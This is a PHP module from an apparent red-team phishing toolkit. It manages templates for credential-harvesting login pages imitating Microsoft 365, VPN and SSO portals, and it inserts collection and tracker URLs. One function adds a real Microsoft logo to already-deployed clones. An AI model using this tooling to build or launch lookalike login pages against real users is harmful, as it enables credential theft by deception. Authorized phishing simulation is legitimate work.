<?php
/**
 * Phase 3.46: hand-curated landing-page clone library.
 *
 * Operators tweak per-engagement (target's actual branding), but a
 * structural template for the three common patterns saves the bulk
 * of the work: multi-step credential collection (Microsoft 365 style),
 * single-page form with optional OTP (generic VPN portal), and the
 * "you are being redirected" → form pattern (generic SAML SSO).
 *
 * Each library entry lives under spear/sniperhost/library/<slug>/ with:
 *
 *   index.html        — primary login HTML, references {{POST_URL}} +
 *                       {{TRACKER_URL}} placeholders the clone action
 *                       substitutes before writing to the operator's
 *                       cloned/ directory.
 *   step2.html        — optional 2FA / second-step page (some templates
 *                       only). Same placeholders apply.
 *   meta.json         — { name, description, pattern, fields[],
 *                         has_2fa, placeholder_notes }
 *   assets/style.css  — minimal stylesheet (intentionally generic so
 *                       the operator can layer their target's brand).
 *
 * The substitution helpers are pure and tested in isolation
 * (tests/LandingLibraryTest.php). The clone action lives at the
 * dispatcher layer; this file only hands it the template bytes +
 * destination path resolution.
 *
 * Trademark + branding caveat:
 *   These templates ship with PLACEHOLDER branding ("[Microsoft 365]"
 *   etc.) rather than actual logos. The operator drops in the real
 *   assets for their authorized engagement. This keeps the public
 *   repo free of redistributed third-party trademarks and forces the
 *   per-engagement customization step.
 */

if (!function_exists('landing_library_root')) {
    function landing_library_root(): string
    {
        return dirname(__FILE__, 2) . '/sniperhost/library';
    }
}

if (!function_exists('landing_library_clones_root')) {
    function landing_library_clones_root(): string
    {
        return dirname(__FILE__, 2) . '/sniperhost/cloned';
    }
}

if (!function_exists('landing_library_heal_m365_logo')) {
    /**
     * 2026-06-09 one-time heal — operators had cloned the m365-login library
     * template while it still contained the literal "[Microsoft 365]"
     * placeholder text. The library now ships a real M365 grid + wordmark
     * SVG; this pass walks every existing m365-login-* clone and replaces
     * the placeholder with the same SVG so already-launched landings stop
     * showing the literal bracket text to recipients.
     *
     * Idempotent: each clone is touched at most once (the literal text is
     * the filter pattern). Touch-not-found clones are skipped. Returns the
     * count of files updated so the caller can log a one-time line.
     */
    function landing_library_heal_m365_logo(?string $clonesRoot = null, ?string $libraryRoot = null): int
    {
        $clonesRoot  = $clonesRoot  ?? landing_library_clones_root();
        $libraryRoot = $libraryRoot ?? landing_library_root();
        if (!is_dir($clonesRoot)) return 0;

        // Pull the canonical SVG snippet straight from the library m365-login
        // index — keeps the heal and the library template byte-identical.
        $template = @file_get_contents($libraryRoot . '/m365-login/index.html');
        if ($template === false) return 0;
        if (!preg_match('#<div class="signin-logo">(.*?)</div>#s', $template, $m)) return 0;
        $newLogoInner = $m[1];
        if (str_contains($newLogoInner, '[Microsoft 365]')) return 0; // library still on placeholder

        $touched = 0;
        $iter = new \DirectoryIterator($clonesRoot);
        foreach ($iter as $entry) {
            if ($entry->isDot() || !$entry->isDir()) continue;
            $slug = $entry->getFilename();
            // Heal m365-login* slugs only (other clones may legitimately use
            // a [...] string literal as a placeholder for their own brand).
            if (strpos($slug, 'm365-login') !== 0) continue;
            $path = $clonesRoot . '/' . $slug . '/index.html';
            if (!is_file($path)) continue;
            $html = (string) @file_get_contents($path);
            if ($html === '' || strpos($html, '[Microsoft 365]') === false) continue;
            $patched = (string) preg_replace(
                '#<div class="signin-logo">\[Microsoft 365\]</div>#',
                '<div class="signin-logo">' . $newLogoInner . '</div>',
                $html,
                1
            );
            if ($patched !== '' && $patched !== $html) {
                if (@file_put_contents($path, $patched) !== false) {
                    $touched++;
                }
            }
        }

        if ($touched > 0 && function_exists('logIt')) {
            logIt('Landing-library M365 logo heal: updated ' . $touched . ' clone(s).');
        }
        return $touched;
    }
}

if (!function_exists('landing_library_substitute_placeholders')) {
    /**
     * Replace {{POST_URL}} and {{TRACKER_URL}} placeholders in HTML
     * with the operator-supplied values. Pure; no I/O. Both
     * substitutions are case-sensitive and replace every occurrence.
     *
     * If $trackerUrl is empty, the {{TRACKER_URL}} placeholder is
     * collapsed to an empty string AND the enclosing <script
     * data-tracker> tag (if present) is also removed so the rendered
     * HTML has no broken script reference.
     */
    function landing_library_substitute_placeholders(string $html, string $postUrl, string $trackerUrl = ''): string
    {
        // Phase 3.46 review fix: two substitution contexts:
        //
        //   - HTML attribute (<script src="{{TRACKER_URL}}">): needs
        //     htmlspecialchars so quotes / angle brackets can't break
        //     out of the attribute.
        //   - JS string literal (var POST_URL = "{{POST_URL}}"): needs
        //     JSON-style backslash escapes; htmlspecialchars there
        //     would turn "&" into "&amp;" inside the JS string, which
        //     then becomes the wrong URL at runtime.
        //
        // We swap each placeholder twice — once for the HTML-attr form
        // ({{POST_URL_ATTR}} / {{TRACKER_URL_ATTR}}), once for the JS
        // form (default {{POST_URL}} / {{TRACKER_URL}}). Templates use
        // whichever variant matches their context.
        $postJs   = landing_library_js_string_escape($postUrl);
        $postAttr = htmlspecialchars($postUrl, ENT_QUOTES, 'UTF-8');
        $html = str_replace('{{POST_URL}}',      $postJs,   $html);
        $html = str_replace('{{POST_URL_ATTR}}', $postAttr, $html);

        if ($trackerUrl === '') {
            // Strip the entire wrapped tracker tag so we don't leave a
            // dangling src="" that 404s in the browser console.
            $html = preg_replace('#<script[^>]*data-tracker[^>]*src="\{\{TRACKER_URL(?:_ATTR)?\}\}"[^>]*></script>#i', '', $html) ?? $html;
            $html = str_replace(['{{TRACKER_URL}}', '{{TRACKER_URL_ATTR}}'], '', $html);
        } else {
            $trackJs   = landing_library_js_string_escape($trackerUrl);
            $trackAttr = htmlspecialchars($trackerUrl, ENT_QUOTES, 'UTF-8');
            $html = str_replace('{{TRACKER_URL}}',      $trackJs,   $html);
            $html = str_replace('{{TRACKER_URL_ATTR}}', $trackAttr, $html);
        }
        return $html;
    }
}

if (!function_exists('landing_library_js_string_escape')) {
    /**
     * Escape a value for use inside a JavaScript double-quoted string
     * literal. Backslash + double-quote + line breaks + the < which
     * could be the start of </script>.
     */
    function landing_library_js_string_escape(string $s): string
    {
        $s = str_replace('\\', '\\\\', $s);
        $s = str_replace('"',  '\\"',  $s);
        // Phase 3.46 second-pass review: cover single-quote so templates
        // using a single-quoted JS string literal can't break out.
        $s = str_replace("'",  "\\'",  $s);
        $s = str_replace("\r", '\\r',  $s);
        $s = str_replace("\n", '\\n',  $s);
        $s = str_replace('<',  '\\u003c', $s);  // defuse </script>
        return $s;
    }
}

if (!function_exists('landing_library_list')) {
    /**
     * Enumerate available library entries. Reads each <slug>/meta.json
     * and returns the merged list sorted by slug.
     *
     * @return array<int, array{
     *   slug:string, name:string, description:string,
     *   pattern:string, has_2fa:bool, fields:array<int,string>,
     *   placeholder_notes:string
     * }>
     */
    function landing_library_list(?string $root = null): array
    {
        $root = $root ?? landing_library_root();
        if (!is_dir($root)) return [];
        $out = [];
        $entries = @scandir($root) ?: [];
        sort($entries);
        foreach ($entries as $slug) {
            if ($slug === '.' || $slug === '..' || $slug[0] === '.') continue;
            $dir = $root . '/' . $slug;
            if (!is_dir($dir)) continue;
            $metaPath = $dir . '/meta.json';
            if (!is_file($metaPath)) continue;
            $j = json_decode((string) @file_get_contents($metaPath), true);
            if (!is_array($j)) continue;
            $out[] = [
                'slug'              => (string) $slug,
                'name'              => (string) ($j['name'] ?? $slug),
                'description'       => (string) ($j['description'] ?? ''),
                'pattern'           => (string) ($j['pattern'] ?? 'single-page'),
                'has_2fa'           => (bool)   ($j['has_2fa'] ?? false),
                'fields'            => is_array($j['fields'] ?? null) ? array_values(array_map('strval', $j['fields'])) : [],
                'placeholder_notes' => (string) ($j['placeholder_notes'] ?? ''),
            ];
        }
        return $out;
    }
}

if (!function_exists('landing_library_template_files')) {
    /**
     * Pure helper: list the files in a library entry that should be
     * copied + (for HTML) substituted. Returns each relative path that
     * exists under $root/<slug>/. Excludes meta.json (we don't ship
     * that into the operator's clone).
     *
     * @return array<int, string> relative paths, e.g. ["index.html", "assets/style.css"]
     */
    function landing_library_template_files(string $slug, ?string $root = null): array
    {
        $root = $root ?? landing_library_root();
        $dir  = $root . '/' . $slug;
        if (!is_dir($dir)) return [];
        $out = [];
        $iter = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator($dir, \FilesystemIterator::SKIP_DOTS)
        );
        foreach ($iter as $f) {
            $rel = ltrim(str_replace($dir, '', (string) $f), '/');
            if ($rel === 'meta.json') continue;
            $out[] = $rel;
        }
        sort($out);
        return $out;
    }
}

if (!function_exists('landing_library_clone_to_path')) {
    /**
     * Copy a library entry into the operator's clones directory,
     * substituting placeholders in any .html file along the way.
     *
     * Returns a structured result with the destination path on
     * success. Refuses to overwrite an existing destination unless
     * $force is true.
     *
     * @return array{ok:bool, slug?:string, path?:string, files?:int, err?:string}
     */
    function landing_library_clone_to_path(
        string $sourceSlug,
        string $destSlug,
        string $postUrl,
        string $trackerUrl,
        bool $force,
        ?string $libraryRoot = null,
        ?string $clonesRoot = null
    ): array {
        $libraryRoot = $libraryRoot ?? landing_library_root();
        $clonesRoot  = $clonesRoot  ?? landing_library_clones_root();
        // Phase 3.46 review fix: source_slug used to flow straight from
        // $POSTJ into a filesystem path. Validate against the same
        // allowlist as destSlug (a-z, 0-9, dash, max 61) so "../../etc"
        // can't escape the library root.
        $sourceSlug = trim($sourceSlug);
        if (!preg_match('/^[a-z0-9][a-z0-9-]{0,60}$/', $sourceSlug)) {
            return ['ok' => false, 'err' => 'Source slug must be a-z, 0-9, dash; max 61 chars'];
        }
        $src = $libraryRoot . '/' . $sourceSlug;
        if (!is_dir($src) || !is_file($src . '/meta.json')) {
            return ['ok' => false, 'err' => 'Library entry not found'];
        }
        $destSlug = trim($destSlug);
        if (!preg_match('/^[a-z0-9][a-z0-9-]{0,60}$/', $destSlug)) {
            return ['ok' => false, 'err' => 'Destination slug must be a-z, 0-9, dash; max 61 chars'];
        }
        $dest = $clonesRoot . '/' . $destSlug;
        if (is_dir($dest) && !$force) {
            return ['ok' => false, 'err' => 'Destination clone already exists; pass force to overwrite'];
        }
        if (!is_dir($clonesRoot) && !@mkdir($clonesRoot, 0775, true) && !is_dir($clonesRoot)) {
            return ['ok' => false, 'err' => 'Could not create clones root'];
        }
        if (!@mkdir($dest, 0775, true) && !is_dir($dest)) {
            return ['ok' => false, 'err' => 'Could not create destination directory'];
        }

        $files = landing_library_template_files($sourceSlug, $libraryRoot);
        $copied = 0;
        foreach ($files as $rel) {
            $from = $src . '/' . $rel;
            $to   = $dest . '/' . $rel;
            $subdir = dirname($to);
            if ($subdir !== $dest && !is_dir($subdir) && !@mkdir($subdir, 0775, true) && !is_dir($subdir)) {
                return ['ok' => false, 'err' => 'Could not create asset subdir'];
            }
            if (str_ends_with(strtolower($rel), '.html')) {
                $html = (string) @file_get_contents($from);
                $html = landing_library_substitute_placeholders($html, $postUrl, $trackerUrl);
                if (@file_put_contents($to, $html) === false) {
                    return ['ok' => false, 'err' => 'Could not write ' . $rel];
                }
            } else {
                if (!@copy($from, $to)) {
                    return ['ok' => false, 'err' => 'Could not copy ' . $rel];
                }
            }
            $copied++;
        }
        return [
            'ok'    => true,
            'slug'  => $destSlug,
            'path'  => 'spear/sniperhost/cloned/' . $destSlug . '/',
            'files' => $copied,
        ];
    }
}
